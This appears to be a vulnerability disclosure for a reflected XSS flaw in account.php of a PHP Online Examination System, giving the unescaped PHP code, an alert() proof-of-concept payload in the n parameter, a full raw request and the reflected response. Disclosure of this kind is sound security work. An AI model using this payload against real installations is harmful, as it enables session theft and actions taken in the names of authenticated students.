# Reflected XSS Vulnerability in `account.php` of the Online Examination System

The quiz answering function of the Online Examination System is handled by `account.php`. When a user accesses the quiz page with `q=quiz&step=2`, the backend reads the `eid`, `n`, and `t` parameters from the URL. In the code, `account.php:164-166` directly reads these parameters, and `account.php:176` concatenates them into the HTML form `action` attribute without any output encoding:

```php
$eid=@$_GET['eid'];
$sn=@$_GET['n'];
$total=@$_GET['t'];
...
echo '<form action="update.php?q=quiz&step=2&eid='.$eid.'&n='.$sn.'&t='.$total.'&qid='.$qid.'" method="POST"  class="form-horizontal">
<br />';
```

Because the application does not perform HTML escaping or output sanitization, an attacker can inject malicious script content through the `n` parameter, resulting in a reflected Cross-Site Scripting (XSS) vulnerability.

This endpoint is not publicly accessible. It requires an authenticated student session because `account.php` checks for `$_SESSION['email']` before rendering the page.

## Impact of the Reflected XSS Vulnerability

An attacker can exploit this vulnerability to execute arbitrary JavaScript in the victim's browser within the context of the authenticated student session. This may lead to session theft, sensitive data disclosure, page content manipulation, phishing, or unauthorized actions performed on behalf of the victim.

## Payload

Injection parameter: `n`

Injected value:

```text
"><sCrIpT>alert(9999)</sCrIpT>
```

Request method: `GET`

Request path:

```text
/account.php?q=quiz&step=2&eid=6a20deccc257d&n="><sCrIpT>alert(9999)</sCrIpT>&t=1
```

Raw request:

```http
GET /account.php?q=quiz&step=2&eid=6a20deccc257d&n="><sCrIpT>alert(9999)</sCrIpT>&t=1 HTTP/1.1
Host: project1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36 Edg/148.0.0.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://project1/account.php?q=1
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Cookie: PHPSESSID=2347fp9qoucglmem34csap1fbp
Connection: keep-alive
```

Reflected response snippet:

```html
<!--quiz start-->
<div class="panel" style="margin:5%"><form action="update.php?q=quiz&step=2&eid=6a20deccc257d&n="><sCrIpT>alert(9999)</sCrIpT>&t=1&qid=" method="POST"  class="form-horizontal">
<br /><br /><button type="submit" class="btn btn-primary"><span class="glyphicon glyphicon-lock" aria-hidden="true"></span>&nbsp;Submit</button></form></div><!--quiz end-->
```

The response shows that the injected payload is reflected into the HTML without encoding, which can cause the browser to parse and execute the attacker-controlled script.

## Sources Download

## 

```
- [Online Examination In PHP With Source Code - Source Code & Projects](https://code-projects.org/online-examination-in-php-with-source-code/)
```

[Online Examination In PHP With Source Code - Source Code & Projects](https://code-projects.org/online-examination-in-php-with-source-code/)



![image-20260604115005785](https://raw.githubusercontent.com/zzzxc643/images/main/image/image-20260604115005785.png)

